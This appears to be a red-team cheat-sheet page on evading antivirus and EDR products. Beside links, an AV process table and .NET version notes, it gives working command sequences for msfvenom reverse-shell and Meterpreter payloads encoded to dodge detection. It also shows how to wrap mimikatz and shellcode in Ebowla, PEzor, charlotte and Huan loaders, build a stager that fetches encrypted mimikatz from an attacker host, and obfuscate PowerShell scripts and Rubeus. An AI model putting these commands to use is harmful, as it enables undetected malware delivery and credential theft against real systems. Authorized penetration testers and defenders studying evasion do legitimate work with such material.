# AV / EDR Evasion

* [https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
* [https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
* [https://github.com/phackt/stager.dll](https://github.com/phackt/stager.dll)
* [https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
* [https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
* [https://xakep.ru/2020/12/23/shikata-ga-nai/](https://xakep.ru/2020/12/23/shikata-ga-nai/)
* [https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?gi=84db9a8c5c5f](https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a?gi=84db9a8c5c5f)
* [https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/](https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/)
* [https://luemmelsec.github.io/Circumventing-Countermeasures-In-AD/](https://luemmelsec.github.io/Circumventing-Countermeasures-In-AD/)
* [https://blog.sunggwanchoi.com/creating-a-loader-poc-using-various-languages/](https://blog.sunggwanchoi.com/creating-a-loader-poc-using-various-languages/)
* [https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/](https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/)
* [https://xakep.ru/2021/07/23/detection-bypassing/](https://xakep.ru/2021/07/23/detection-bypassing/)
* [https://zen.yandex.ru/media/id/5d4f02da027a1500ad43866f/obhodim-antivirusy-kriptor-net-prilojenii-5fc6a199a8f33a1036140386](https://zen.yandex.ru/media/id/5d4f02da027a1500ad43866f/obhodim-antivirusy-kriptor-net-prilojenii-5fc6a199a8f33a1036140386)
* [https://www.synacktiv.com/publications/a-dive-into-microsoft-defender-for-identity.html](https://www.synacktiv.com/publications/a-dive-into-microsoft-defender-for-identity.html)

![BypassAV Mindmap](https://raw.githubusercontent.com/CMEPW/BypassAV/main/img/Bypass-AV.png)




## Recon

- [https://github.com/ethereal-vx/Antivirus-Artifacts](https://github.com/ethereal-vx/Antivirus-Artifacts)
- [https://github.com/Mr-Un1k0d3r/EDRs](https://github.com/Mr-Un1k0d3r/EDRs)

Common AV process names:

| Process Name |          Vendor/Product        |
|--------------|--------------------------------|
| avp.exe      | KIS / KES                      |
| cpda.exe     | Check Point End Point Security |
| egui.exe     | ESET GUI                       |
| ekrn.exe     | ESET Kernel Service            |
| MsMpEng.exe  | Windows Defender               |
| ntrtscan.exe | Trend Micro OfficeScan         |
| tmlisten.exe | Trend Micro OfficeScan         |

Search for active AV processes on hosts (local admin priveleges required):

```
Cmd > WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName
PS > Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "MsMpEng.exe"} | select ProcessName,PSComputerName}
```

Identify Microsoft.NET version from inspecting assembly properties:

```
PS > cd C:\Windows\Microsoft.NET\Framework64\
PS > ls
PS > cd .\v4.0.30319\
PS > Get-Item .\clr.dll | Fl
Or
PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll)).FileVersion
```

Identify Microsoft.NET version from querying the registry:

```
PS > Get-ItemProperty "HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -Name Release
```

Windows build <-> default .NET Framework version associations:

| Windows Build | Default .NET Framework Version |
|---------------|--------------------------------|
| 1511          | 4.6.1                          |
| 1607          | 4.6.2                          |
| 1703          | 4.7                            |
| 1709          | 4.7.1                          |
| 1803          | 4.7.2                          |
| 1909+         | 4.8                            |

.NET Framework version <-> CLR version associations:

| .NET Framework Version | CLR Version |
|------------------------|-------------|
| 2.0, 3.0, 3.5          | 2           |
| 4, 4.5-4.8             | 4           |

{% hint style="info" %}
Note that we don't have to target the exact .NET Framework version when compiling our tools. It's enough to match the above relationship between .NET Framework version and CLR version, i. e. all 4.x versions will execute on CLR v4. For example, Rubeus compiled to target v4.5 will run on a machine with only .NET v4.0 installed.
{% endhint %}




## Attacking EDRs

- [https://mansk1es.gitbook.io/edr-binary-abuse/](https://mansk1es.gitbook.io/edr-binary-abuse/)
- [https://xss.is/threads/67718/](https://xss.is/threads/67718/)




## EDR Blindspots

- [https://www.naksyn.com/edr%20evasion/2022/09/01/operating-into-EDRs-blindspot.html](https://www.naksyn.com/edr%20evasion/2022/09/01/operating-into-EDRs-blindspot.html)
- [https://github.com/naksyn/Pyramid](https://github.com/naksyn/Pyramid)
- [https://gist.github.com/snovvcrash/39263ccae8e07210c3f87c9472b4c908](https://gist.github.com/snovvcrash/39263ccae8e07210c3f87c9472b4c908)
- [https://github.com/naksyn/PythonMemoryModule](https://github.com/naksyn/PythonMemoryModule)
- [https://www.naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html](https://www.naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html)



### BOFs with Python

- [https://github.com/rkbennett/pybof](https://github.com/rkbennett/pybof)
- [https://tishina.in/execution/python-inmemory-bof](https://tishina.in/execution/python-inmemory-bof)
- [https://github.com/zimnyaa/inmembof.py](https://github.com/zimnyaa/inmembof.py)




## Tools



### msfvenom

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -a x86 --platform win -e x86/shikata_ga_nai -i 3 -f exe -o rev.exe
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -e x86/shikata_ga_nai -i 9 -f raw | msfvenom --platform windows -a x86 -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 11 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -k -f exe -o met.exe
```



### Veil-Evasion

Hyperion + Pescramble

```
$ wine hyperion.exe input.exe output.exe
$ wine PEScrambler.exe -i input.exe -o output.exe
```



### GreatSCT

* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

{% embed url="https://youtu.be/krC5j1Ab44I?t=3730" %}

Install and generate a payload:

```
$ git clone https://github.com/GreatSCT/GreatSCT ~/tools/GreatSCT
$ cd ~/tools/GreatSCT/setup
$ ./setup.sh
$ cd .. && ./GreatSCT.py
...generate a payload...
$ ls -la /usr/share/greatsct-output/handlers/payload.{rc,xml}

$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
```

Exec with `msbuild.exe` and get a shell:

```
PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
```



### Ebowla

```
$ git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
$ sudo apt install golang mingw-w64 wine python-dev -y
$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.13.37 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
$ vi genetic.config
...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
$ python ebowla.py rev.exe genetic.config && rm rev.exe
$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && rm output/go_symmetric_rev.exe.go
[+] output/ebowla-rev.exe
```



### PEzor

* [https://github.com/phra/PEzor](https://github.com/phra/PEzor)

Wrap executable into PEzor:

```
$ bash PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 evil.exe -z 2
```



### inceptor

* [https://klezvirus.github.io/RedTeaming/AV_Evasion/CodeExeNewDotNet/](https://klezvirus.github.io/RedTeaming/AV_Evasion/CodeExeNewDotNet/)
* [https://github.com/klezVirus/inceptor](https://github.com/klezVirus/inceptor)



### ScareCrow

* [https://github.com/optiv/ScareCrow](https://github.com/optiv/ScareCrow)
* [https://www.grahamhelton.com/blog/scarecrow/](https://www.grahamhelton.com/blog/scarecrow/)
* [https://adamsvoboda.net/evading-edr-with-scarecrow/](https://adamsvoboda.net/evading-edr-with-scarecrow/)



### Huan

* [https://github.com/frkngksl/Huan](https://github.com/frkngksl/Huan)

```
Cmd > .\Huan.exe mimikatz.exe mimiLoader.exe
Cmd > .\mimiLoader.exe
```



### charlotte

* [https://github.com/9emin1/charlotte](https://github.com/9emin1/charlotte)
* [https://github.com/cepxeo/dll4shell](https://github.com/cepxeo/dll4shell)

```
$ sudo apt install 'mingw-w64*' -y
$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f raw > beacon.bin
$ python charlotte.py
Cmd > rundll32.exe charlotte.dll, <XOR_KEY>
```



### MeterPwrShell

* [https://github.com/GetRektBoy724/MeterPwrShell/releases](https://github.com/GetRektBoy724/MeterPwrShell/releases)
* [https://raikia.com/tool-powershell-encoder/](https://raikia.com/tool-powershell-encoder/)

```
$ sudo ./MeterPwrShell2Kalix64 -c noaptupdate
```



### stager_libpeconv

- [https://github.com/tothi/stager_libpeconv](https://github.com/tothi/stager_libpeconv)
- [https://github.com/hasherezade/libpeconv](https://github.com/hasherezade/libpeconv)

```
$ git clone --recurse-submodules https://github.com/tothi/stager_libpeconv && cd stager_libpeconv
$ openssl enc -rc4 -in mimikatz.exe -K `echo -n '1234567890123456' | xxd -p` -nosalt -out mimikatz.rc4
$ make stager IMPLANT_IP=10.10.13.37 IMPLANT_PORT=1337 RC4_KEY=1234567890123456
$ ./socket_binary_server.py mimikatz.rc4 10.10.13.37 1337
Cmd > dist\stager.exe
```



### PowerShell Tactics

- [https://github.com/specterops/at-ps](https://github.com/specterops/at-ps)
- [https://telegra.ph/Komandy-PowerShell-dlya-pentesterov-03-01](https://telegra.ph/Komandy-PowerShell-dlya-pentesterov-03-01)



### PowerShell Obfuscation

- [https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation](https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation)
- [https://github.com/t3l3machus/PowerShell-Obfuscation-Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)
- [https://github.com/tokyoneon/Chimera](https://github.com/tokyoneon/Chimera)
- [https://github.com/klezVirus/chameleon](https://github.com/klezVirus/chameleon)
- [https://github.com/AdrianVollmer/PowerHub](https://github.com/AdrianVollmer/PowerHub)


#### Invoke-Obfuscation

* [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
* [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)


#### Out-EncryptedScript.ps1

* [https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
* [https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/](https://powersploit.readthedocs.io/en/latest/ScriptModification/Out-EncryptedScript/)

```
PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) s4lt -FilePath .\evil.ps1
PS > . .\evil.ps1
PS > $dec = de "Passw0rd!" s4lt
PS > Invoke-Expression $dec
```


#### PowerShellArmoury

* [https://github.com/cfalta/PowerShellArmoury](https://github.com/cfalta/PowerShellArmoury)
* [https://cyberstoph.org/posts/2019/12/evading-anti-virus-with-powershell-armoury/](https://cyberstoph.org/posts/2019/12/evading-anti-virus-with-powershell-armoury/)
* [https://cyberstoph.org/posts/2020/02/psarmoury-1.4-now-with-even-more-armour/](https://cyberstoph.org/posts/2020/02/psarmoury-1.4-now-with-even-more-armour/)

```
PS > git clone https://github.com/cfalta/PowerShellArmoury
PS > cd PowerShellArmoury
PS > curl https://github.com/snovvcrash/WeaponizeKali.sh/raw/main/conf/PSArmoury.json -o PSArmoury.json
PS > . .\New-PSArmoury.ps1
PS > New-PSArmoury -ValidateOnly -Config PSArmoury.json
PS > New-PSArmoury -Path armored.ps1 -Config PSArmoury.json
PS > cat -raw .\armored.ps1 | iex
```



### .NET Obfuscators

- [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
- [https://github.com/Flangvik/ObfuscatedSharpCollection](https://github.com/Flangvik/ObfuscatedSharpCollection)
- [https://www.r-tec.net/r-tec-blog-net-assembly-obfuscation-for-memory-scanner-evasion.html](https://www.r-tec.net/r-tec-blog-net-assembly-obfuscation-for-memory-scanner-evasion.html)


#### Tools

- [https://github.com/yck1509/ConfuserEx](https://github.com/yck1509/ConfuserEx)
- [https://github.com/XenocodeRCE/neo-ConfuserEx](https://github.com/XenocodeRCE/neo-ConfuserEx)
- [https://github.com/dr4k0nia/XorStringsNET](https://github.com/dr4k0nia/XorStringsNET)
- [https://github.com/0xb11a1/yetAnotherObfuscator](https://github.com/0xb11a1/yetAnotherObfuscator)

##### InvisibilityCloak

- [https://github.com/h4wkst3r/InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak)

```
PS > wget https://github.com/h4wkst3r/InvisibilityCloak/raw/main/InvisibilityCloak.py -o InvisibilityCloak.py
PS > git clone https://github.com/GhostPack/Rubeus
PS > python .\InvisibilityCloak.py -d .\Rubeus\ -n (-join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})) -m reverse
PS > cd Rubeus
PS > devenv /build Release .\ChOVuwPZcNQmXtKF.sln
```

{% code title="InvisibilityCloak.ps1" %}
```powershell
$repo = "GhostPack/Rubeus"

$cloak = "C:\Users\user\Desktop\Tools\InvisibilityCloak.py"
$devenv = "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\devenv.com"

$target = $repo.Split('/')[1]
$obf = -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
git clone "https://github.com/$repo" "C:\Windows\Temp\$target"
python $cloak -d "C:\Windows\Temp\$target" -n $obf -m reverse
& $devenv /build Release "C:\Windows\Temp\$target\$obf.sln"
mv "C:\Windows\Temp\$target\$obf\bin\Release\$obf.exe" "\\vmware-host\Shared Folders\share-host\$obf.exe"
#Remove-Item -Recurse -Force "C:\Windows\Temp\$target"
```
{% endcode %}



### SharpSploit

- [https://github.com/cobbr/SharpSploit](https://github.com/cobbr/SharpSploit)
- [https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/SharpSploit%20-%20Quick%20Command%20Reference.md](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/SharpSploit%20-%20Quick%20Command%20Reference.md)


#### SharpGen

- [https://github.com/cobbr/SharpGen](https://github.com/cobbr/SharpGen)
- [https://cobbr.io/SharpGen.html](https://cobbr.io/SharpGen.html)

##### Execution.ShellCode

```
$ ~/tools/PEzor/deps/donut/donut -i GruntHTTP.exe -o grunt.bin
$ echo -n 'var shellcode = Convert.FromBase64String("' > shellcode.txt
$ echo -n `base64 -w0 grunt.bin` >> shellcode.txt
$ echo '");' >> shellcode.txt
$ echo 'ShellCode.ShellCodeExecute(shellcode);' >> shellcode.txt
$ ~/.dotnet/dotnet bin/Debug/netcoreapp2.1/SharpGen.dll -f payload.exe -s shellcode.txt -c Shell -d net40
```
